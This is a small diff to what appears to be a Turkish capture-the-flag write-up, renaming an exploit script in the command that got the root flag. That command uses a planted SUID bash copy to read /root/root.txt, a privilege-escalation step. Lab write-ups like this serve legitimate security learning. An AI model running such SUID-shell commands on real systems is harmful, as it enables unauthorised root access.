@@ -163,4 +163,4 @@ text
 Root flag'i aldım:
 bash
 
-python3 marimo_exploit.py "/tmp/.suid_bash -p -c 'cat /root/root.txt'"
+python3 exploit.py "/tmp/.suid_bash -p -c 'cat /root/root.txt'"
